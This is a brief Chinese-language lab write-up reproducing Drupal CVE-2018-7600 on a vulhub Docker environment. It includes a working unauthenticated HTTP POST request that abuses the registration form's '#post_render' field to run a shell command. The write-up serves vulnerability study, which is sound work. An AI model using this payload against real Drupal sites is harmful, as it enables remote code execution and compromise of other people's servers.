Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由由内容管理系统和PHP开发框架共同构成，在GPL2.0及更新协议下发布。连续多年荣获全球最佳CMS大奖，是基于PHP语言最著名的WEB应用程序。

2018年3月28日，Drupal Security Team官方发布公告称Drupal
6,7,8等多个子版本存在远程代码执行漏洞，攻击者可以利用该漏洞执行恶意代码。

Drupal未对表单请求数据做严格过滤，导致攻击者可以将恶意代码注入表单内容，此漏洞允许未经身份验证的攻击者在默认或常见的Drupal安装上执行远程代码执行。

影响范围: Drupal 6,7,8等多个子版本

本文仅作漏洞复现记录与实现，利用流程如下:

一、漏洞环境

本次演示环境采用vulhub搭建，执行以下命令搭建

cd /drupal/CVE-2018-7600/

docker-compose up -d

语言选择英文，中文安装可能会报错，数据库选择sqlite数据库，然后其他都默认就可以了

![1617177970_60642d72db0660613100d.png!small](https://image.3001.net/images/20210331/1617177970_60642d72db0660613100d.png!small)

漏洞链接： <http://192.168.101.152:8080/>

访问之后是这个样子的

![1617177998_60642d8ec8419bf69b5a6.png!small](https://image.3001.net/images/20210331/1617177998_60642d8ec8419bf69b5a6.png!small)

二、漏洞利用

直接发送以下数据包就可以执行命令了

POST
/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
HTTP/1.1  
Host: 192.168.101.152:8080  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 103

form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id

![1617178074_60642dda84390a045ef3e.png!small](https://image.3001.net/images/20210331/1617178074_60642dda84390a045ef3e.png!small)

命令执行成功

